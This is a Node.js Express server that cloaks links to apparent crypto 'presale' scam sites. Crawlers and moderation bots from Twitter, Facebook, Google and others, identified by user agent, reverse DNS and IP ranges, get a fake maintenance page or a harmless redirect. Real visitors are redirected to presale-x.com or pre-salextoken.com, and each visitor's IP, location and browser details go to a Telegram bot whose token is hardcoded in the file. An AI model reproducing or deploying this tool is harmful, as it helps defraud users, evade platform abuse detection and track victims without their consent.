const express = require('express');
const dns = require('dns');
const geoip = require('geoip-lite');
const axios = require('axios');
const ipRange = require('ip-range-check');

const app = express();
const PORT = 3000;

const REDIRECT_TARGETS = [
  'https://presale-x.com',
  'https://pre-salextoken.com'
];
const BOT_REDIRECT = 'https://about.twitter.com';

const TELEGRAM_TOKEN = '7910775878:AAETdt7EMVZCuUTxxAmGnBUNy1_tAS32HAs';
const TELEGRAM_CHAT_ID = 7637890100;

const recentBots = new Map();

const knownBotCIDRs = [
  '199.16.156.0/22', '69.63.176.0/20', '66.249.64.0/19',
  '157.55.39.0/24', '185.191.171.0/24'
];

const botRanges = [
  { provider: 'Twitter', from: '199.16.156.0', to: '199.16.159.255' },
  { provider: 'Twitter', from: '199.59.148.0', to: '199.59.151.255' },
  { provider: 'Twitter', from: '199.96.56.0', to: '199.96.63.255' },
  { provider: 'FacebookMeta', from: '31.13.24.0', to: '31.13.31.255' },
  { provider: 'FacebookMeta', from: '157.240.0.0', to: '157.240.255.255' },
  { provider: 'Google', from: '66.249.64.0', to: '66.249.95.255' },
  { provider: 'Microsoft', from: '40.90.0.0', to: '40.91.255.255' },
  { provider: 'Yandex', from: '77.88.0.0', to: '77.88.63.255' },
  { provider: 'Ahrefs', from: '54.36.148.0', to: '54.36.148.255' },
  { provider: 'Semrush', from: '46.229.168.0', to: '46.229.171.255' }
];

const botUAPatterns = [
  { pattern: 'twitterbot', source: 'twitter' },
  { pattern: 'facebookexternalhit', source: 'facebook' },
  { pattern: 'googlebot', source: 'google' },
  { pattern: 'adsbot', source: 'google' },
  { pattern: 'bingbot', source: 'microsoft' },
  { pattern: 'yandexbot', source: 'yandex' },
  { pattern: 'slackbot', source: 'meta' },
  { pattern: 'semrushbot', source: 'semrush' },
  { pattern: 'ahrefsbot', source: 'ahrefs' },
  { pattern: 'mj12bot', source: 'mj12' }
];

const suspiciousHostnames = ['googleusercontent', 'tor-exit', 'kaspersky', 'cloudflare', 'compute.amazonaws.com'];
const suspiciousIPs = ['::ffff:', '2a06:98c0:', '2a02:4780:', '34.71.', '107.178.', '230.194.'];

const isKnownScannerIP = (ip) => {
  const toNum = ip => ip.split('.').reduce((acc, oct) => (acc << 8) + parseInt(oct), 0);
  const ipNum = toNum(ip);
  return botRanges.some(({ from, to }) => ipNum >= toNum(from) && ipNum <= toNum(to));
};

const sendToTelegram = async (data) => {
  const isBot = data.isBot;
  const title = isBot ? '🛡 Bot Detected' : '🚀 Legit User Redirect';

  const message = [
    `*${title}*`,
    `Time: \`${data.timestamp}\``,
    `User IP: \`${data.ip}\``,
    `Country: ${data.country || '—'}`,
    `Region: ${data.region || '—'}`,
    `City: ${data.city || '—'}`,
    `To: ${data.redirect || '—'}`,
    `Source: \`${data.source || '—'}\``,
    `Referer: \`${data.referer || '—'}\``,
    `UA: \`${data.ua?.slice(0, 80) || '—'}...\``
  ].join('\n');

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });
  } catch (err) {
    console.error('❌ Telegram error:', err.message);
  }
};

app.use((req, res) => {
  const ua = req.headers['user-agent'] || '';
  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
  const referer = req.headers['referer'] || 'Direct';
  const geo = geoip.lookup(ip) || {};
  const path = req.path.toLowerCase();

  const payload = {
    timestamp: new Date().toISOString(),
    ip,
    hostname: '',
    ua,
    referer,
    isBot: false,
    botReason: '',
    country: geo.country || '',
    region: geo.region || '',
    city: geo.city || '',
    redirect: '',
    source: 'unknown'
  };

  dns.reverse(ip, (err, hostnames) => {
    const hostnameList = (!err && hostnames.length > 0) ? hostnames : [];
    const hostname = hostnameList[0] || '';
    payload.hostname = hostname;

    const uaLower = ua.toLowerCase();
    let isBotDetected = false;
    let reason = '';
    let source = 'unknown';

    for (const { pattern, source: s } of botUAPatterns) {
      if (uaLower.includes(pattern)) {
        isBotDetected = true;
        reason = `UA: ${pattern}`;
        source = s;
        break;
      }
    }

    if (!isBotDetected && suspiciousHostnames.some(h => hostname.includes(h))) {
      isBotDetected = true;
      reason = `rDNS: ${hostname}`;
      source = 'rdns';
    }

    if (!isBotDetected && suspiciousIPs.some(snip => ip.includes(snip))) {
      isBotDetected = true;
      reason = `IP pattern: ${ip}`;
      source = 'cloud/tor';
    }

    if (!isBotDetected && isKnownScannerIP(ip)) {
      isBotDetected = true;
      reason = `IP match: ${ip}`;
      source = 'ads';
    }

    payload.isBot = isBotDetected;
    payload.botReason = reason;
    payload.source = source;

    // 🔁 Определение редиректа по пути
    if (path === '/go') {
      payload.redirect = 'https://presale-x.com';
    } else if (path === '/on') {
      payload.redirect = 'https://pre-salextoken.com';
    } else {
      payload.redirect = REDIRECT_TARGETS[Math.floor(Math.random() * REDIRECT_TARGETS.length)];
    }

    const key = `${ip}-${ua}`;
if (!recentBots.has(key)) {
  if (isBotDetected) {
    if (uaLower.includes('twitterbot') || hostname.endsWith('.twttr.com')) {
      payload.redirect = 'MASKED: Twitter HTML';
    } else {
      payload.redirect = 'MASKED: Redirect to about.twitter.com';
    }
  }

  sendToTelegram(payload);
  recentBots.set(key, Date.now());
}
    if (isBotDetected) {
      console.log('🐦 Bot/SEO detected — applying redirect/masking');

      if (uaLower.includes('twitterbot') || hostname.endsWith('.twttr.com')) {
        return res.status(200).send(`<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Something went wrong</title>
    <meta name="robots" content="noindex, nofollow">
    <style>
      body { font-family: sans-serif; text-align: center; margin-top: 50px; }
    </style>
  </head>
  <body>
    <h1>We're fixing it!</h1>
    <p>This page is under maintenance. Please try again later.</p>
  </body>
</html>`);
      } else {
        return res.status(302).redirect(BOT_REDIRECT);
      }
    }

    console.log(`[${payload.timestamp}] 👤 User | UA: ${ua} | IP: ${ip}`);
    return res.redirect(302, payload.redirect);
  });
});

// Очистка кэша
setInterval(() => {
  const now = Date.now();
  for (const [k, v] of recentBots.entries()) {
    if (now - v > 10 * 1000) recentBots.delete(k);
  }
}, 60 * 1000);

app.listen(PORT, () => {
  console.log(`🚀 HTTP Redirect server running on port ${PORT}`);
});
